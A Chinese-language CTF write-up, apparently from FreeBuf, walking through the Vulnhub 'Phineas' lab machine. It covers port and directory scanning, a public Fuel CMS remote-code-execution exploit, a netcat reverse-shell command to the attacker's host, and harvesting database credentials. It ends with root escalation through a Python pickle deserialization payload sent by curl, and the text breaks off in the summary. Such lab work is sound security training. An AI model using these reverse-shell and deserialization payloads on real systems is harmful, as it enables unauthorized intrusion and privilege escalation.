---
title: Vulnhub靶场之Phineas
url: https://www.freebuf.com/articles/web/421209.html
source: FreeBuf网络安全行业门户
date: 2025-02-08
fetch_date: 2025-10-06T20:37:35.069486
---

# Vulnhub靶场之Phineas

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

Vulnhub靶场之Phineas

* ![]()
* 关注

* [Web安全](https://www.freebuf.com/articles/web)

Vulnhub靶场之Phineas

2025-02-08 17:56:12

所属地 北京

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

靶场：https://www.vulnhub.com/entry/phineas-1,674/

安装：下载之后导入到vmware，网络模式选择nat

攻击机：kali

## 一、信息搜集

arp-scan -l主机ip探测

![1738896472_67a57458be98db92d7654.png!small](https://image.3001.net/images/20250207/1738896472_67a57458be98db92d7654.png!small)

192.168.203.134是新增加的ip，也就是靶机ip

nmap扫描

nmap --min-rate 10000 -p- 192.168.203.134  --端口扫描

![1738896605_67a574dda7890f9f9707f.png!small](https://image.3001.net/images/20250207/1738896605_67a574dda7890f9f9707f.png!small)

nmap -sT -A -sV -O -sC -p 22,80,111,3306 192.168.203.134 -oA ./nmap/detail  --端口详细信息探测

![1738896707_67a57543925bb4d3b2a72.png!small](https://image.3001.net/images/20250207/1738896707_67a57543925bb4d3b2a72.png!small)

浏览器访问80端口，是apache的默认页面

![1738896761_67a57579c1d7896e4db96.png!small](https://image.3001.net/images/20250207/1738896761_67a57579c1d7896e4db96.png!small)

基于根路径进行目录扫描

gobuster dir -w /root/Desktop/Pentest/fuzzDicts/directoryDicts/en\_dirctories\_all.txt -u http://192.168.203.134/ -t 5

![1738897622_67a578d6bcb5021feb82c.png!small](https://image.3001.net/images/20250207/1738897622_67a578d6bcb5021feb82c.png!small)

就扫出来一个/structure，访问看看

![1738897115_67a576dbdce800eb8934d.png!small](https://image.3001.net/images/20250207/1738897115_67a576dbdce800eb8934d.png!small)

看了下源码也没什么有用的东西，还得继续爆破

gobuster dir -w /root/Desktop/Pentest/fuzzDicts/directoryDicts/en\_dirctories\_all.txt -u http://192.168.203.134/structure/ -t 5

![1738897689_67a57919c17eccca23ec9.png!small](https://image.3001.net/images/20250207/1738897689_67a57919c17eccca23ec9.png!small)

访问下robots.txt

![1738897750_67a57956d6cbee2677ad0.png!small](https://image.3001.net/images/20250207/1738897750_67a57956d6cbee2677ad0.png!small)

访问下这个路径，会302跳转到/structure/fuel/start响应404。按理说robots.txt中的目录应该不会有404的情况，那么问题很有可能还是出在访问路径上。

先放下这个去看看/assets目录

![1738898521_67a57c59e2f20ec667054.png!small](https://image.3001.net/images/20250207/1738898521_67a57c59e2f20ec667054.png!small)

![1738898521_67a57c59e5518c2312b33.png!small](https://image.3001.net/images/20250207/1738898521_67a57c59e5518c2312b33.png!small)

挨个看了一遍没发现有用的东西，就一个index.html无法访问。还是接着去看路径吧......

之前的目录爆破都是基于路径的，试下敏感文件爆破

gobuster dir -w /root/Desktop/Pentest/fuzzDicts/directoryDicts/fileName10000.txt -u http://192.168.203.134/structure/ -t 5

![1738898676_67a57cf4de251da4b0d86.png!small](https://image.3001.net/images/20250207/1738898676_67a57cf4de251da4b0d86.png!small)

多了index.php和README.md两个文件，README.md不用多说通常都是描述文件，看一下

![1738898847_67a57d9fb718da7c8e75e.png!small](https://image.3001.net/images/20250207/1738898847_67a57d9fb718da7c8e75e.png!small)

通过阅读可以得知两个主要信息：

1.fuel是一个cms

2.网站使用fuel应该是小于1.4的版本

那么利用思路就有了，从网上搜一下cms相关的漏洞，最好是rce

直接google搜fuelcms就能看到

![1738899208_67a57f08954125e6ff812.png!small](https://image.3001.net/images/20250207/1738899208_67a57f08954125e6ff812.png!small)

![1738899249_67a57f3188e91693289d6.png!small](https://image.3001.net/images/20250207/1738899249_67a57f3188e91693289d6.png!small)

可以看到漏洞可利用版本`Version: <= 1.4.1`

## 二、RCE漏洞利用

将exp保存为py文件，分析exp代码可以知道漏洞利用需要一个url，结合上面敏感文件爆破时得到的index.php，就可以拿到一个/structure/index.php，访问这个路径和直接访问/structure/页面是一样的。

执行exp

python exp.py -u <http://192.168.203.134/structure/index.php>

![1738899663_67a580cfa99b89ef39395.png!small](https://image.3001.net/images/20250207/1738899663_67a580cfa99b89ef39395.png!small)

没毛病，那就直接反弹吧

![1738899847_67a58187b47dbed633b81.png!small](https://image.3001.net/images/20250207/1738899847_67a58187b47dbed633b81.png!small)GG，urlencode试下

nc%20192.168.203.135%208888%20-e%20%2Fbin%2Fsh

![1738899947_67a581eb97194a4eee4af.png!small](https://image.3001.net/images/20250207/1738899947_67a581eb97194a4eee4af.png!small)

还是不行，换一个反弹端口尝试，将8888改成443

![1738900048_67a582503a55ff4de7776.png!small](https://image.3001.net/images/20250207/1738900048_67a582503a55ff4de7776.png!small)

成功，不需要urlencode

![1738900103_67a58287737d4c98e543d.png!small](https://image.3001.net/images/20250207/1738900103_67a58287737d4c98e543d.png!small)

想用python美化下交互，但是失败了不知道什么原因。凑合用吧.....

进入到fuel目录中翻下敏感文件，最终在/var/www/html/structure/fuel/application/config/database.php中找到了数据库的配置信息

![1738906965_67a59d551d88198a4464c.png!small?1738906965668](https://image.3001.net/images/20250207/1738906965_67a59d551d88198a4464c.png!small?1738906965668)

尝试使用ssh登录anna账户

![1738907119_67a59def71062ed00b8a6.png!small?1738907119974](https://image.3001.net/images/20250207/1738907119_67a59def71062ed00b8a6.png!small?1738907119974)

## 三、反序列化提权

进入用户目录/home/anna

![1738907284_67a59e94573304012be81.png!small?1738907284757](https://image.3001.net/images/20250207/1738907284_67a59e94573304012be81.png!small?1738907284757)

Desktop目录中有user.txt

执行sudo -l看看有没有可利用的

![1738908662_67a5a3f62dea84d8e889c.png!small?1738908662514](https://image.3001.net/images/20250207/1738908662_67a5a3f62dea84d8e889c.png!small?1738908662514)

发现用户目录下的web目录有一个flask的应用，而且有root权限，那十有八九提权点就在这里

![1738908087_67a5a1b7e3109a8d400e6.png!small?1738908088508](https://image.3001.net/images/20250207/1738908087_67a5a1b7e3109a8d400e6.png!small?1738908088508)

看下源码

![1738907424_67a59f20c69cf522c8c7a.png!small?1738907425505](https://image.3001.net/images/20250207/1738907424_67a59f20c69cf522c8c7a.png!small?1738907425505)

很简单，/heaven接收一个awesome参数的post请求，再使用pickle处理参数。

用的应该是flask的默认端口5000，查看下5000端口是否在用，之前用nmap扫描并没有扫描到

netstat -anp|grep 5000

![1738907516_67a59f7c3f3516a40844b.png!small?1738907516712](https://image.3001.net/images/20250207/1738907516_67a59f7c3f3516a40844b.png!small?1738907516712)

端口在用，但是扫描不到，那么可以推测从外部无法访问，需要转发到攻击机或者直接在靶机请求。

通过上面的源码可以到应用比较简单，就不转发了，直接在靶机上curl一下

![1738909050_67a5a57a443a0ab1817f4.png!small?1738909050748](https://image.3001.net/images/20250207/1738909050_67a5a57a443a0ab1817f4.png!small?1738909050748)

服务可以访问，那剩下就是怎么利用的问题了

构造请求参数，使用python3版本，先确定下权限

> import pickle
> import os
> import base64
>
> class genpoc():
>    def \_\_reduce\_\_(self):
>    s = """whoami > 2.txt"""
>    return os.system, (s,)
> e = genpoc()
> poc = pickle.dumps(e)
> print(poc)
> poc\_base64 = base64.urlsafe\_b64encode(poc)
> print(poc\_base64)

![1738909639_67a5a7c74ac90e7e0ab03.png!small](https://image.3001.net/images/20250207/1738909639_67a5a7c74ac90e7e0ab03.png!small)

下面的就是经过序列化并base64编码后的请求参数，构造curl请求

> curl http://127.0.0.1:5000/heaven -d "awesome=gASVKQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjA53aG9hbWkgPiAyLnR4dJSFlFKULg=="

在靶机上执行，会在当前目录下看到2.txt

![1738909777_67a5a85185819097eb204.png!small?1738909777793](https://image.3001.net/images/20250207/1738909777_67a5a85185819097eb204.png!small?1738909777793)

成功了，接下来就是修改代码，把s改成反弹shell的命令，重新生成payload再发送请求

![1738910107_67a5a99bb638f688f6077.png!small?1738910110812](https://image.3001.net/images/20250207/1738910107_67a5a99bb638f688f6077.png!small?1738910110812)

python3 -c "import pty;pty.spawn('/bin/bash')"美化一下（之前不能执行应该是权限问题）

![1738910223_67a5aa0f6ae7e536996f0.png!small?1738910224274](https://image.3001.net/images/20250207/1738910223_67a5aa0f6ae7e536996f0.png!small?1738910224274)

## 四、总结

1.靶场本身不难，但是目录爆破如果字典不行就很难突破，平时还要留心整理字典

2.反...